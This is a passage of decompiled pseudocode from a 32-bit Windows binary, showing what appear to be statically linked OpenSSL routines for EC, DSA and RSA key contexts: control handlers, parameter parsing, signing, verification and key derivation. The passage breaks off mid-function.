  if ( !v4 )
    return 0;
  sub_41CE20(a2, (void *)0x357, (int)v4);
  return 1;
}

//----- (00466FD0) --------------------------------------------------------
BOOL __cdecl sub_466FD0(FILE *Stream)
{
  int v1; // eax

  v1 = _fileno(Stream);
  return sub_4CAD60(*(_DWORD **)(*(_DWORD *)(v1 + 20) + 20)) != 0;
}

//----- (00467000) --------------------------------------------------------
int __cdecl sub_467000(int a1, struct std::ios_base *a2)
{
  int v2; // edi
  int v3; // eax

  v2 = *(_DWORD *)(a1 + 20);
  v3 = sub_4075B0((int)a2, -257);
  sub_4CB020(*(int **)(v2 + 20), v3);
  sub_407590((int)a2, 256);
  std::spfun(a2, (int)sub_466FD0);
  return 1;
}

//----- (00467050) --------------------------------------------------------
BOOL __cdecl sub_467050(int a1, int a2, int *a3, int a4)
{
  int v4; // edi
  int v5; // eax
  int v6; // eax
  BOOL result; // eax
  int *v8; // esi

  v4 = *(_DWORD *)(a1 + 20);
  v5 = sub_445DB0(a4);
  v6 = sub_407480(v5);
  if ( v6 < 0 )
    return 0;
  v8 = a3;
  *a3 = v6;
  if ( a2 )
  {
    result = sub_4CAD80(*(_DWORD **)(v4 + 20), a2, &a1);
    if ( !result )
      return result;
    *v8 = a1;
  }
  return 1;
}

//----- (004670B0) --------------------------------------------------------
int __cdecl sub_4670B0(int a1, int a2, int Size, void *Src)
{
  int v4; // ecx
  int result; // eax

  v4 = *(_DWORD *)(a1 + 20);
  if ( a2 == 1 )
  {
    *(_DWORD *)v4 = Src;
    return 1;
  }
  if ( a2 == 6 )
    return (Src || Size <= 0) && Size >= -1 && sub_437A10(v4 + 4, Src, Size);
  if ( a2 != 7 )
    return -2;
  result = sub_4CAB30(
             *(int ***)(v4 + 20),
             *(void **)(*(_DWORD *)(*(_DWORD *)(a1 + 8) + 20) + 8),
             **(_DWORD **)(*(_DWORD *)(a1 + 8) + 20),
             *(int **)v4,
             *(volatile LONG **)(a1 + 4));
  if ( result )
    return 1;
  return result;
}

//----- (00467130) --------------------------------------------------------
int __cdecl sub_467130(int a1, const char *a2, const char *a3)
{
  if ( !a3 )
    return 0;
  if ( !strcmp(a2, "key") )
    return sub_443B50(a1, 6, a3);
  if ( !strcmp(a2, "hexkey") )
    return (int)sub_443B90(a1, 6, a3);
  return -2;
}

//----- (004671E0) --------------------------------------------------------
int __cdecl sub_4671E0(struct std::ios_base *a1, int a2)
{
  int result; // eax
  int v3; // esi
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  void *v6; // eax

  result = sub_466EE0((int)a1);
  if ( result )
  {
    v3 = sub_457690(a2);
    v4 = (_DWORD *)sub_457690((int)a1);
    v5 = (_DWORD *)v4[5];
    *v4 = *(_DWORD *)v3;
    if ( sub_4CAF60(v5, *(_DWORD **)(v3 + 20))
      && ((v6 = *(void **)(v3 + 12)) == 0 || sub_437A10((int)(v4 + 1), v6, *(_DWORD *)(v3 + 4))) )
    {
      return 1;
    }
    else
    {
      sub_466F40(a1);
      return 0;
    }
  }
  return result;
}

//----- (00467260) --------------------------------------------------------
int __cdecl sub_467260(int a1)
{
  int result; // eax

  result = (int)sub_413430(0x20u);
  if ( result )
  {
    *(_BYTE *)(result + 12) = -1;
    *(_BYTE *)(result + 13) = 1;
    *(_DWORD *)(a1 + 20) = result;
    return 1;
  }
  return result;
}

//----- (00467290) --------------------------------------------------------
int __cdecl sub_467290(int a1, int a2)
{
  _BYTE *v2; // esi
  int v3; // edi
  volatile LONG **v4; // eax
  volatile LONG *v5; // eax
  void *v6; // eax
  void *v7; // eax

  v2 = sub_413430(0x20u);
  if ( !v2 )
    return 0;
  v2[12] = -1;
  v2[13] = 1;
  *(_DWORD *)(a1 + 20) = v2;
  v3 = *(_DWORD *)(a2 + 20);
  if ( *(_DWORD *)v3 )
  {
    v4 = sub_436AE0(*(int **)v3);
    *(_DWORD *)v2 = v4;
    if ( !v4 )
      return 0;
  }
  *((_DWORD *)v2 + 1) = *(_DWORD *)(v3 + 4);
  if ( *(_DWORD *)(v3 + 8) )
  {
    v5 = sub_41E0E0(*(_DWORD *)(v3 + 8));
    *((_DWORD *)v2 + 2) = v5;
    if ( !v5 )
      return 0;
  }
  v2[13] = *(_BYTE *)(v3 + 13);
  *((_DWORD *)v2 + 4) = *(_DWORD *)(v3 + 16);
  *((_DWORD *)v2 + 7) = *(_DWORD *)(v3 + 28);
  v6 = *(void **)(v3 + 20);
  if ( v6 )
  {
    v7 = sub_424800(v6, *(_DWORD *)(v3 + 24));
    *((_DWORD *)v2 + 5) = v7;
    if ( !v7 )
      return 0;
  }
  else
  {
    *((_DWORD *)v2 + 5) = 0;
  }
  *((_DWORD *)v2 + 6) = *(_DWORD *)(v3 + 24);
  return 1;
}

//----- (00467350) --------------------------------------------------------
void __cdecl sub_467350(int a1)
{
  int v1; // esi

  v1 = *(_DWORD *)(a1 + 20);
  if ( v1 )
  {
    sub_4367A0(*(volatile LONG ***)v1);
    sub_41DE70(*(volatile LONG **)(v1 + 8));
    sub_413490(*(void **)(v1 + 20));
    sub_413490((void *)v1);
  }
}

//----- (00467390) --------------------------------------------------------
int __cdecl sub_467390(int a1, int a2, int *a3, int a4, int a5)
{
  int v5; // ebx
  int v6; // edi
  int v7; // esi
  int v8; // eax
  int result; // eax
  unsigned int v10; // eax
  int *v11; // ebp
  int v12; // eax

  v5 = a2;
  v6 = *(_DWORD *)(a1 + 20);
  v7 = *(_DWORD *)(*(_DWORD *)(a1 + 8) + 20);
  if ( a2 )
  {
    v10 = sub_4201D0(v7);
    v11 = a3;
    if ( *a3 >= v10 )
    {
      if ( *(_DWORD *)(v6 + 4) )
        v12 = sub_435D30(*(_DWORD *)(v6 + 4));
      else
        v12 = 64;
      result = sub_47FDC0(v12, a4, a5, v5, (int)&a1, v7);
      if ( result > 0 )
      {
        *v11 = a1;
        return 1;
      }
    }
    else
    {
      sub_408310(16, 218, 100, (int)"crypto\\ec\\ec_pmeth.c", 110);
      return 0;
    }
  }
  else
  {
    v8 = sub_4201D0(v7);
    *a3 = v8;
    return 1;
  }
  return result;
}

//----- (00467440) --------------------------------------------------------
int __cdecl sub_467440(int a1, int a2, int a3, int a4, int a5)
{
  int v5; // ecx
  int v6; // esi
  int v7; // eax

  v5 = *(_DWORD *)(a1 + 20);
  v6 = *(_DWORD *)(*(_DWORD *)(a1 + 8) + 20);
  if ( *(_DWORD *)(v5 + 4) )
    v7 = sub_435D30(*(_DWORD *)(v5 + 4));
  else
    v7 = 64;
  return sub_47FE50(v7, a4, a5, a2, a3, v6);
}

//----- (00467490) --------------------------------------------------------
int __usercall sub_467490@<eax>(void *a1@<ebx>, size_t *a2@<edi>, _DWORD *a3)
{
  int v3; // ecx
  int v4; // eax
  int *v5; // esi
  int v6; // eax
  int v7; // eax
  int v9; // eax

  v3 = a3[2];
  if ( v3 && (v4 = a3[3]) != 0 )
  {
    v5 = *(int **)(a3[5] + 8);
    if ( !v5 )
      v5 = *(int **)(v3 + 20);
    if ( !a1 )
    {
      v6 = sub_407400((int)v5);
      v7 = (sub_435F50(v6) + 7) / 8;
LABEL_7:
      *a2 = v7;
      return 1;
    }
    v9 = _fileno(*(FILE **)(v4 + 20));
    v7 = sub_435B30(a1, *a2, v9, v5, 0);
    if ( v7 > 0 )
      goto LABEL_7;
    return 0;
  }
  else
  {
    sub_408310(16, 217, 140, (int)"crypto\\ec\\ec_pmeth.c", 155);
    return 0;
  }
}

//----- (00467520) --------------------------------------------------------
int __cdecl sub_467520(_DWORD *Size, void *a2, size_t *a3)
{
  _DWORD *v3; // ebp
  int v4; // esi
  int result; // eax
  _BYTE *v6; // ebx
  int v7; // eax
  int v8; // edi
  _BYTE **v9; // eax
  int v10; // esi

  v3 = Size;
  v4 = Size[5];
  result = 1;
  if ( *(_BYTE *)(v4 + 13) == 1 )
    return sub_467490(a2, a3, Size);
  if ( a2 )
  {
    if ( *a3 == *(_DWORD *)(v4 + 28) && sub_467490(0, (size_t *)&Size, Size) && (v6 = sub_4133F0((size_t)Size)) != 0 )
    {
      v7 = sub_467490(v6, (size_t *)&Size, v3);
      v8 = (int)Size;
      if ( !v7
        || (v9 = sub_4CC990(
                   (char *)a2,
                   *a3,
                   (int)v6,
                   (unsigned int)Size,
                   *(_DWORD *)(v4 + 20),
                   *(_DWORD *)(v4 + 24),
                   *(int **)(v4 + 16)),
            v10 = 1,
            !v9) )
      {
        v10 = 0;
      }
      sub_4134B0(v6, v8);
      return v10;
    }
    else
    {
      return 0;
    }
  }
  else
  {
    *a3 = *(_DWORD *)(v4 + 28);
  }
  return result;
}

//----- (00467620) --------------------------------------------------------
unsigned int __cdecl sub_467620(int a1, int a2, int a3, _DWORD *a4)
{
  int v4; // esi
  unsigned int result; // eax
  int *v6; // edi
  volatile LONG **v7; // esi
  int v8; // edi
  int v9; // eax

  v4 = *(_DWORD *)(a1 + 20);
  if ( a2 <= 4097 )
  {
    if ( a2 == 4097 )
    {
      v6 = sub_4375B0(a3);
      if ( v6 )
      {
        sub_4367A0(*(volatile LONG ***)v4);
        *(_DWORD *)v4 = v6;
        return 1;
      }
      else
      {
        sub_408310(16, 197, 141, (int)"crypto\\ec\\ec_pmeth.c", 225);
        return 0;
      }
    }
    else
    {
      switch ( a2 )
      {
        case 1:
          if ( sub_435D30((int)a4) != 64
            && sub_435D30((int)a4) != 416
            && sub_435D30((int)a4) != 675
            && sub_435D30((int)a4) != 672
            && sub_435D30((int)a4) != 673
            && sub_435D30((int)a4) != 674 )
          {
            sub_408310(16, 197, 138, (int)"crypto\\ec\\ec_pmeth.c", 322);
            return 0;
          }
          *(_DWORD *)(v4 + 4) = a4;
          result = 1;
          break;
        case 2:
        case 5:
        case 7:
        case 11:
          return 1;
        case 13:
          *a4 = *(_DWORD *)(v4 + 4);
          return 1;
        default:
          return -2;
      }
    }
    return result;
  }
  switch ( a2 )
  {
    case 4098:
      v7 = *(volatile LONG ***)v4;
      if ( v7 )
      {
        std::spfun((struct std::ios_base *)v7, a3);
        return 1;
      }
      else
      {
        sub_408310(16, 197, 139, (int)"crypto\\ec\\ec_pmeth.c", 234);
        return 0;
      }
    case 4099:
      if ( a3 == -2 )
      {
        LOBYTE(result) = *(_BYTE *)(v4 + 12);
        if ( (_BYTE)result == 0xFF )
          return ((unsigned int)sub_44CEB0(*(_DWORD *)(*(_DWORD *)(a1 + 8) + 20)) >> 12) & 1;
        else
          return (char)result;
      }
      if ( (unsigned int)(a3 + 1) > 2 )
        return -2;
      *(_BYTE *)(v4 + 12) = a3;
      if ( a3 == -1 )
      {
        sub_41DE70(*(volatile LONG **)(v4 + 8));
        *(_DWORD *)(v4 + 8) = 0;
        return 1;
      }
      v8 = *(_DWORD *)(*(_DWORD *)(a1 + 8) + 20);
      v9 = *(_DWORD *)(v8 + 12);
      if ( !v9 )
        return -2;
      if ( sub_416DC0(*(_DWORD *)(v9 + 12)) )
        return 1;
      if ( *(_DWORD *)(v4 + 8) || (result = (unsigned int)sub_41E0E0(v8), (*(_DWORD *)(v4 + 8) = result) != 0) )
      {
        if ( a3 )
          sub_41E580(*(_DWORD *)(v4 + 8), 4096);
        else
          sub_41E590(*(_DWORD *)(v4 + 8), 4096);
        return 1;
      }
      return result;
    case 4100:
      if ( a3 == -2 )
        return *(char *)(v4 + 13);
      if ( a3 != 1 && a3 != 2 )
        return -2;
      *(_BYTE *)(v4 + 13) = a3;
      return 1;
    case 4101:
      *(_DWORD *)(v4 + 16) = a4;
      return 1;
    case 4102:
      *a4 = *(_DWORD *)(v4 + 16);
      return 1;
    case 4103:
      if ( a3 <= 0 )
        return -2;
      *(_DWORD *)(v4 + 28) = a3;
      return 1;
    case 4104:
      *a4 = *(_DWORD *)(v4 + 28);
      return 1;
    case 4105:
      sub_413490(*(void **)(v4 + 20));
      *(_DWORD *)(v4 + 20) = a4;
      *(_DWORD *)(v4 + 24) = a4 != 0 ? a3 : 0;
      return 1;
    case 4106:
      *a4 = *(_DWORD *)(v4 + 20);
      return *(_DWORD *)(v4 + 24);
    default:
      return -2;
  }
}

//----- (00467950) --------------------------------------------------------
int __cdecl sub_467950(int a1, const char *a2, char *String)
{
  int v3; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax

  if ( strcmp(a2, "ec_paramgen_curve") )
  {
    if ( !strcmp(a2, "ec_param_enc") )
    {
      if ( !strcmp(String, "explicit") )
      {
        v5 = 0;
        return sub_443A60(a1, 408, 6, 4098, v5, 0);
      }
      if ( !strcmp(String, "named_curve") )
      {
        v5 = 1;
        return sub_443A60(a1, 408, 6, 4098, v5, 0);
      }
    }
    else
    {
      if ( !strcmp(a2, "ecdh_kdf_md") )
      {
        v6 = sub_430D80((int)String);
        if ( v6 )
          return sub_443A60(a1, 408, 1024, 4101, 0, v6);
        sub_408310(16, 198, 151, (int)"crypto\\ec\\ec_pmeth.c", 372);
        return 0;
      }
      if ( !strcmp(a2, "ecdh_cofactor_mode") )
      {
        v7 = atoi(String);
        return sub_443A60(a1, 408, 1024, 4099, v7, 0);
      }
    }
    return -2;
  }
  v3 = sub_437660(String);
  if ( v3 )
    return sub_443A60(a1, 408, 6, 4097, v3, 0);
  v3 = sub_423B70(String);
  if ( v3 )
    return sub_443A60(a1, 408, 6, 4097, v3, 0);
  v3 = sub_423A80(String);
  if ( v3 )
    return sub_443A60(a1, 408, 6, 4097, v3, 0);
  sub_408310(16, 198, 141, (int)"crypto\\ec\\ec_pmeth.c", 356);
  return 0;
}

//----- (00467BB0) --------------------------------------------------------
volatile LONG ***__cdecl sub_467BB0(int a1, int a2)
{
  int **v2; // edi
  volatile LONG ***result; // eax
  volatile LONG *v4; // esi
  int v5; // edi

  v2 = *(int ***)(a1 + 20);
  if ( *v2 )
  {
    result = (volatile LONG ***)sub_41DE60();
    v4 = (volatile LONG *)result;
    if ( result )
    {
      v5 = sub_41E520(result, *v2);
      if ( v5 )
      {
        sub_41CE20(a2, (void *)0x198, (int)v4);
        return (volatile LONG ***)v5;
      }
      else
      {
        sub_41DE70(v4);
        return 0;
      }
    }
  }
  else
  {
    sub_408310(16, 219, 139, (int)"crypto\\ec\\ec_pmeth.c", 391);
    return 0;
  }
  return result;
}

//----- (00467C30) --------------------------------------------------------
int __cdecl sub_467C30(int a1, int a2)
{
  int **v2; // ebp
  int result; // eax
  volatile LONG ***v4; // esi

  v2 = *(int ***)(a1 + 20);
  if ( !*(_DWORD *)(a1 + 8) && !*v2 )
  {
    sub_408310(16, 199, 139, (int)"crypto\\ec\\ec_pmeth.c", 410);
    return 0;
  }
  result = sub_41DE60();
  v4 = (volatile LONG ***)result;
  if ( result )
  {
    sub_41CE20(a2, (void *)0x198, result);
    if ( *(_DWORD *)(a1 + 8) )
    {
      result = sub_41CF00((_DWORD *)a2, *(_DWORD *)(a1 + 8));
      if ( !result )
        return result;
    }
    else
    {
      result = sub_41E520(v4, *v2);
      if ( !result )
        return result;
    }
    return sub_41E150(*(_DWORD **)(a2 + 20));
  }
  return result;
}

//----- (00467CD0) --------------------------------------------------------
int __cdecl sub_467CD0(_DWORD *a1)
{
  _DWORD *v1; // eax

  v1 = sub_4133F0(0x18u);
  if ( !v1 )
    return 0;
  v1[2] = 0;
  v1[5] = 0;
  *v1 = 1024;
  v1[1] = 160;
  a1[5] = v1;
  a1[8] = v1 + 3;
  a1[9] = 2;
  return 1;
}

//----- (00467D20) --------------------------------------------------------
int __cdecl sub_467D20(_DWORD *a1, int a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // ecx

  v2 = sub_4133F0(0x18u);
  if ( !v2 )
    return 0;
  v2[2] = 0;
  v2[5] = 0;
  *v2 = 1024;
  v2[1] = 160;
  a1[5] = v2;
  a1[9] = 2;
  a1[8] = v2 + 3;
  v3 = *(_DWORD **)(a2 + 20);
  *v2 = *v3;
  v2[1] = v3[1];
  v2[2] = v3[2];
  v2[5] = v3[5];
  return 1;
}

//----- (00467D90) --------------------------------------------------------
void __cdecl sub_467D90(int a1)
{
  sub_413490(*(void **)(a1 + 20));
}

//----- (00467DB0) --------------------------------------------------------
int __cdecl sub_467DB0(int a1, void *a2, _DWORD *a3, int a4, int a5)
{
  int v5; // ecx
  int v6; // esi
  int v7; // eax
  int v8; // ecx
  int result; // eax

  v5 = *(_DWORD *)(a1 + 20);
  v6 = *(_DWORD *)(*(_DWORD *)(a1 + 8) + 20);
  if ( *(_DWORD *)(v5 + 20) )
  {
    v7 = sub_407480(*(_DWORD *)(v5 + 20));
    v8 = a5;
    if ( a5 != v7 )
      return 0;
  }
  else
  {
    v8 = a5;
    if ( a5 != 20 )
      return 0;
  }
  result = sub_41DCA0(0, a4, v8, a2, &a1, v6);
  if ( result > 0 )
  {
    *a3 = a1;
    return 1;
  }
  return result;
}

//----- (00467E20) --------------------------------------------------------
int __cdecl sub_467E20(int a1, _DWORD **Block, int a3, int a4, int a5)
{
  int v5; // ecx
  int v6; // esi
  int v7; // eax
  int v8; // ecx

  v5 = *(_DWORD *)(a1 + 20);
  v6 = *(_DWORD *)(*(_DWORD *)(a1 + 8) + 20);
  if ( *(_DWORD *)(v5 + 20) )
  {
    v7 = sub_407480(*(_DWORD *)(v5 + 20));
    v8 = a5;
    if ( a5 != v7 )
      return 0;
  }
  else
  {
    v8 = a5;
    if ( a5 != 20 )
      return 0;
  }
  return sub_41DD10(0, a4, v8, Block, a3, v6);
}

//----- (00467E80) --------------------------------------------------------
int __cdecl sub_467E80(int a1, int a2, int a3, _DWORD *a4)
{
  int *v4; // edi
  _DWORD *v5; // esi

  v4 = *(int **)(a1 + 20);
  if ( a2 <= 4097 )
  {
    if ( a2 != 4097 )
    {
      switch ( a2 )
      {
        case 1:
          v5 = a4;
          if ( sub_435D30((int)a4) == 64
            || sub_435D30((int)a4) == 116
            || sub_435D30((int)a4) == 66
            || sub_435D30((int)a4) == 675
            || sub_435D30((int)a4) == 672
            || sub_435D30((int)a4) == 673
            || sub_435D30((int)a4) == 674 )
          {
            goto LABEL_12;
          }
          sub_408310(10, 120, 106, (int)"crypto\\dsa\\dsa_pmeth.c", 150);
          return 0;
        case 2:
          sub_408310(10, 120, 150, (int)"crypto\\dsa\\dsa_pmeth.c", 167);
          return -2;
        case 5:
        case 7:
        case 11:
          return 1;
        case 13:
          *a4 = v4[5];
          return 1;
        default:
          return -2;
      }
    }
    if ( a3 >= 256 )
    {
      *v4 = a3;
      return 1;
    }
    return -2;
  }
  if ( a2 == 4098 )
  {
    if ( a3 != 160 && a3 != 224 && a3 && a3 != 256 )
      return -2;
    v4[1] = a3;
    return 1;
  }
  else
  {
    if ( a2 != 4099 )
      return -2;
    v5 = a4;
    if ( sub_435D30((int)a4) == 64 || sub_435D30((int)a4) == 675 || sub_435D30((int)a4) == 672 )
    {
LABEL_12:
      v4[5] = (int)v5;
      return 1;
    }
    else
    {
      sub_408310(10, 120, 106, (int)"crypto\\dsa\\dsa_pmeth.c", 136);
      return 0;
    }
  }
}

//----- (00468040) --------------------------------------------------------
int __cdecl sub_468040(int a1, const char *a2, char *String)
{
  int v3; // eax
  int v5; // eax
  int v6; // eax

  if ( !strcmp(a2, "dsa_paramgen_bits") )
  {
    v3 = atoi(String);
    return sub_443A60(a1, 116, 2, 4097, v3, 0);
  }
  else if ( !strcmp(a2, "dsa_paramgen_q_bits") )
  {
    v5 = atoi(String);
    return sub_443A60(a1, 116, 2, 4098, v5, 0);
  }
  else if ( !strcmp(a2, "dsa_paramgen_md") )
  {
    v6 = sub_430D80((int)String);
    return sub_443A60(a1, 116, 2, 4099, 0, v6);
  }
  else
  {
    return -2;
  }
}

//----- (00468160) --------------------------------------------------------
int __usercall sub_468160@<eax>(__m64 a1@<mm0>, int a2, int a3)
{
  int v3; // edi
  _DWORD *v4; // eax
  _DWORD *v5; // esi
  volatile LONG *v6; // ebx
  int v8; // edi

  v3 = *(_DWORD *)(a2 + 20);
  if ( *(_DWORD *)(a2 + 28) )
  {
    v4 = sub_416EC0();
    v5 = v4;
    if ( !v4 )
      return 0;
    sub_4CB2A0(v4, a2);
  }
  else
  {
    v5 = 0;
  }
  v6 = (volatile LONG *)sub_41DAF0();
  if ( !v6 )
  {
    sub_416F00(v5);
    return 0;
  }
  v8 = sub_4CB340(a1, (int)v6, *(_DWORD *)v3, *(_DWORD *)(v3 + 4), *(int **)(v3 + 8), 0, 0, 0, 0, 0, v5);
  sub_416F00(v5);
  if ( v8 )
  {
    sub_41CE20(a3, (void *)0x74, (int)v6);
    return v8;
  }
  else
  {
    sub_41D610(v6);
    return 0;
  }
}

//----- (00468200) --------------------------------------------------------
int __usercall sub_468200@<eax>(__m64 a1@<mm0>, int a2, _DWORD *a3)
{
  int result; // eax
  int v4; // eax

  if ( !*(_DWORD *)(a2 + 8) )
  {
    sub_408310(10, 121, 107, (int)"crypto\\dsa\\dsa_pmeth.c", 229);
    return 0;
  }
  v4 = sub_41DAF0();
  if ( !v4 )
    return 0;
  sub_41CE20((int)a3, (void *)0x74, v4);
  result = sub_41CF00(a3, *(_DWORD *)(a2 + 8));
  if ( result )
    return sub_4CCC70(a1, a3[5]);
  return result;
}

//----- (00468270) --------------------------------------------------------
int __cdecl sub_468270(_DWORD *a1)
{
  int result; // eax

  result = (int)sub_413430(0x2Cu);
  if ( result )
  {
    *(_DWORD *)result = 1024;
    *(_DWORD *)(result + 16) = 1;
    *(_DWORD *)(result + 28) = -2;
    a1[5] = result;
    a1[8] = result + 8;
    a1[9] = 2;
    return 1;
  }
  return result;
}

//----- (004682C0) --------------------------------------------------------
int __cdecl sub_4682C0(_DWORD *a1, int a2)
{
  char *v2; // esi
  int v3; // edi
  void **v4; // eax
  void *v5; // eax

  v2 = (char *)sub_413430(0x2Cu);
  if ( !v2 )
    return 0;
  *(_DWORD *)v2 = 1024;
  *((_DWORD *)v2 + 4) = 1;
  *((_DWORD *)v2 + 7) = -2;
  a1[5] = v2;
  a1[9] = 2;
  a1[8] = v2 + 8;
  v3 = *(_DWORD *)(a2 + 20);
  *(_DWORD *)v2 = *(_DWORD *)v3;
  if ( *(_DWORD *)(v3 + 4) )
  {
    v4 = sub_4176D0(*(_DWORD *)(v3 + 4));
    *((_DWORD *)v2 + 1) = v4;
    if ( !v4 )
      return 0;
  }
  *((_DWORD *)v2 + 4) = *(_DWORD *)(v3 + 16);
  *((_DWORD *)v2 + 5) = *(_DWORD *)(v3 + 20);
  *((_DWORD *)v2 + 6) = *(_DWORD *)(v3 + 24);
  if ( *(_DWORD *)(v3 + 36) )
  {
    sub_413490(*((void **)v2 + 9));
    v5 = sub_424800(*(void **)(v3 + 36), *(_DWORD *)(v3 + 40));
    *((_DWORD *)v2 + 9) = v5;
    if ( !v5 )
      return 0;
    *((_DWORD *)v2 + 10) = *(_DWORD *)(v3 + 40);
  }
  return 1;
}

//----- (00468390) --------------------------------------------------------
BOOL __usercall sub_468390@<eax>(int a1@<esi>, int a2)
{
  int v3; // eax
  void *v4; // eax

  if ( *(_DWORD *)(a1 + 32) )
    return 1;
  v3 = sub_41CA90(*(_DWORD *)(a2 + 8));
  v4 = sub_4133F0(v3);
  *(_DWORD *)(a1 + 32) = v4;
  return v4 != 0;
}

//----- (004683D0) --------------------------------------------------------
void __cdecl sub_4683D0(int a1)
{
  int v1; // esi

  v1 = *(_DWORD *)(a1 + 20);
  if ( v1 )
  {
    sub_417060(*(void ***)(v1 + 4));
    sub_413490(*(void **)(v1 + 32));
    sub_413490(*(void **)(v1 + 36));
    sub_413490((void *)v1);
  }
}

//----- (00468420) --------------------------------------------------------
int __cdecl sub_468420(unsigned int a1, int a2, _DWORD *a3, void *Src, int Size)
{
  int v5; // ebp
  int v6; // esi
  _BYTE *v7; // edi
  int v8; // eax
  int v9; // ebx
  int result; // eax
  int v11; // eax
  unsigned int v12; // eax
  int v13; // eax
  char v14; // al
  int v15; // edx
  int v16; // eax
  int v17; // [esp-14h] [ebp-24h]
  int v18; // [esp-14h] [ebp-24h]
  int v19; // [esp-10h] [ebp-20h]
  int v20; // [esp-Ch] [ebp-1Ch]
  int v21; // [esp-Ch] [ebp-1Ch]
  int v22; // [esp-4h] [ebp-14h]

  v5 = a1;
  v6 = *(_DWORD *)(a1 + 20);
  v7 = *(_BYTE **)(*(_DWORD *)(a1 + 8) + 20);
  if ( !*(_DWORD *)(v6 + 20) )
  {
    result = sub_407110(Size, (int)Src, a2, (int)v7);
LABEL_23:
    if ( result >= 0 )
    {
      *a3 = result;
      return 1;
    }
    return result;
  }
  v8 = sub_407480(*(_DWORD *)(v6 + 20));
  v9 = Size;
  if ( Size != v8 )
  {
    sub_408310(4, 142, 143, (int)"crypto\\rsa\\rsa_pmeth.c", 118);
    return -1;
  }
  if ( sub_435D30(*(_DWORD *)(v6 + 20)) != 95 )
  {
    v11 = *(_DWORD *)(v6 + 16);
    if ( v11 == 5 )
    {
      v22 = *(_DWORD *)(v5 + 8);
      a1 = v9 + 1;
      v12 = sub_41CA90(v22);
      if ( v12 < a1 )
      {
        sub_408310(4, 142, 120, (int)"crypto\\rsa\\rsa_pmeth.c", 134);
        return -1;
      }
      if ( !sub_468390(v6, v5) )
      {
        sub_408310(4, 142, 65, (int)"crypto\\rsa\\rsa_pmeth.c", 138);
        return -1;
      }
      memcpy(*(void **)(v6 + 32), Src, v9);
      v13 = sub_435D30(*(_DWORD *)(v6 + 20));
      v14 = sub_429960(v13);
      v15 = a2;
      *(_BYTE *)(v9 + *(_DWORD *)(v6 + 32)) = v14;
      result = sub_407110(a1, *(_DWORD *)(v6 + 32), v15, (int)v7);
    }
    else if ( v11 == 1 )
    {
      v20 = a2;
      v17 = (int)Src;
      v16 = sub_435D30(*(_DWORD *)(v6 + 20));
      result = sub_4CD280(v16, v17, v9, v20, (int *)&a1, v7);
      if ( result <= 0 )
        return result;
      result = a1;
    }
    else
    {
      if ( v11 != 6
        || !sub_468390(v6, v5)
        || !sub_4CCFF0(
              (int)v7,
              *(_BYTE **)(v6 + 32),
              (int)Src,
              *(int **)(v6 + 20),
              *(_DWORD *)(v6 + 24),
              *(_DWORD *)(v6 + 28)) )
      {
        return -1;
      }
      v21 = a2;
      v19 = *(_DWORD *)(v6 + 32);
      v18 = sub_4070E0((int)v7);
      result = sub_407110(v18, v19, v21, (int)v7);
    }
    goto LABEL_23;
  }
  if ( *(_DWORD *)(v6 + 16) != 1 )
    return -1;
  result = sub_4CD8D0(0, (int)Src, v9, a2, (int *)&a1, (int)v7);
  if ( result > 0 )
  {
    result = a1;
    goto LABEL_23;
  }
  return result;
}

//----- (00468610) --------------------------------------------------------
int __cdecl sub_468610(int a1, void *a2, int *a3, int a4, size_t Size)
{
  int v5; // edi
  _DWORD *v6; // esi
  int v7; // eax
  int v8; // ecx
  int v10; // eax
  int v11; // edi
  int v12; // eax
  int v13; // eax
  _DWORD *v14; // [esp-14h] [ebp-1Ch]
  int v15; // [esp-Ch] [ebp-14h]
  size_t v16; // [esp-8h] [ebp-10h]
  int v17; // [esp-4h] [ebp-Ch]

  v5 = a1;
  v6 = *(_DWORD **)(a1 + 20);
  v7 = v6[5];
  if ( v7 )
  {
    v8 = v6[4];
    if ( v8 == 5 )
    {
      if ( !sub_468390((int)v6, a1) )
        return -1;
      v10 = sub_407130(Size, a4, v6[8], *(_DWORD *)(*(_DWORD *)(v5 + 8) + 20));
      if ( v10 < 1 )
        return 0;
      v11 = v10 - 1;
      v12 = sub_435D30(v6[5]);
      if ( *(unsigned __int8 *)(v6[8] + v11) != sub_429960(v12) )
      {
        sub_408310(4, 141, 100, (int)"crypto\\rsa\\rsa_pmeth.c", 192);
        return 0;
      }
      if ( v11 != sub_407480(v6[5]) )
      {
        sub_408310(4, 141, 143, (int)"crypto\\rsa\\rsa_pmeth.c", 197);
        return 0;
      }
      if ( a2 )
        memcpy(a2, (const void *)v6[8], v11);
    }
    else
    {
      if ( v8 != 1 )
        return -1;
      v17 = *(_DWORD *)(*(_DWORD *)(a1 + 8) + 20);
      v16 = Size;
      v15 = a4;
      v14 = a2;
      v13 = sub_435D30(v7);
      if ( sub_4CD530(v13, 0, 0, v14, &a1, v15, v16, v17) <= 0 )
        return 0;
      v11 = a1;
    }
  }
  else
  {
    v11 = sub_407130(Size, a4, (int)a2, *(_DWORD *)(*(_DWORD *)(a1 + 8) + 20));
  }
  if ( v11 < 0 )
    return v11;
  *a3 = v11;
  return 1;
}

//----- (00468780) --------------------------------------------------------
unsigned int __cdecl sub_468780(int a1, int a2, size_t Size, int a4, int a5)
{
  int v5; // eax
  int v6; // esi
  int v7; // edx
  int v8; // edi
  int v9; // eax
  int v10; // eax
  unsigned int result; // eax
  int v12; // eax
  void *v13; // eax
  _BYTE *v14; // esi
  _BYTE *v15; // ecx
  char *v16; // [esp-14h] [ebp-1Ch]
  int v17; // [esp-10h] [ebp-18h]
  int v18; // [esp-Ch] [ebp-14h]
  size_t v19; // [esp-8h] [ebp-10h]

  v5 = *(_DWORD *)(a1 + 8);
  v6 = *(_DWORD *)(a1 + 20);
  v7 = *(_DWORD *)(v6 + 20);
  v8 = *(_DWORD *)(v5 + 20);
  if ( !v7 )
  {
    if ( *(_DWORD *)(v6 + 32) || (v12 = sub_41CA90(v5), v13 = sub_4133F0(v12), (*(_DWORD *)(v6 + 32) = v13) != 0) )
    {
      result = sub_407130(Size, a2, *(_DWORD *)(v6 + 32), v8);
      if ( !result )
        return result;
      goto LABEL_17;
    }
    return -1;
  }
  v9 = *(_DWORD *)(v6 + 16);
  if ( v9 == 1 )
  {
    v19 = Size;
    v18 = a2;
    v17 = a5;
    v16 = (char *)a4;
    v10 = sub_435D30(v7);
    return sub_4CD890(v10, v16, v17, v18, v19, v8);
  }
  if ( v9 != 5 )
  {
    if ( v9 == 6 && sub_468390(v6, a1) )
    {
